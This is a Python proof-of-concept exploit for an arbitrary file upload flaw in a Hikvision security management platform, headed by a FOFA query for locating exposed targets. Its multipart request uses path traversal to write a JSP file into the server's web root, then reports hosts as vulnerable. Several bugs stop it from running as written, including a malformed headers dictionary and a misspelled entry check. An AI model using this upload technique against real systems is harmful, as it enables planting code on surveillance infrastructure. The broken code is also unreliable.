#fofa  app="HIKVISION-综合安防管理平台"
#导包
import requests,argparse,sys,json,re
from multiprocessing.dummy import Pool
#关闭警告
requests.packages.urllib3.disable_warnings()
#横幅
def banner():
    test = """
              _                 _    __ _ _      
             | |               | |  / _(_) |     
  _   _ _ __ | | ___   __ _  __| | | |_ _| | ___ 
 | | | | '_ \| |/ _ \ / _` |/ _` | |  _| | |/ _ \
 | |_| | |_) | | (_) | (_| | (_| | | | | | |  __/
  \__,_| .__/|_|\___/ \__,_|\__,_| |_| |_|_|\___|
       | |                                       
       |_|                                       


"""
    print(test)


#主函数
def main():
    banner()
    parse = argparse.ArgumentParser(description='HiKVISION 综合安防管理平台 report 任意文件上传漏洞')
    parse.add_argument('-url','--url',dest='url',type=str,help='please input url')
    args = parse.parse_args()
    if args.url():
        poc()
    else:
        print(f"Usage:\n\t python3 {sys.argv[0]} -h")
    

#poc函数
def poc(target):
    payload = '/center/api/files;.js '
    headers = { 'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2227.0 Safari/537.36'
                'Content-Type: multipart/form-data; boundary=----WebKitFormBoundarykcerblvm'
        
    }
    data = '------WebKitFormBoundarykcerblvm\nContent-Disposition: form-data; name="file"; filename="../../../../../../../../../../../opt/hikvision/web/components/tomcat85linux64.1/webapps/eportal/mctc.jsp"\nContent-Type: application/zip\n\n<%out.print(43000 * 42955);new java.io.File(application.getRealPath(request.getServletPath())).delete();%>\n\n------WebKitFormBoundarykcerblvm--'
    res = requests.post(url=target + payload,headers=headers,data=data,verify=False)
    if res.status_code == 200 and 'data' in res.text:
        print(f'[+]{target}存在漏洞')
    else:
        print(f'[-]{target}不存在漏洞')

#函数入口
if __name__ =='__main___':
    main()
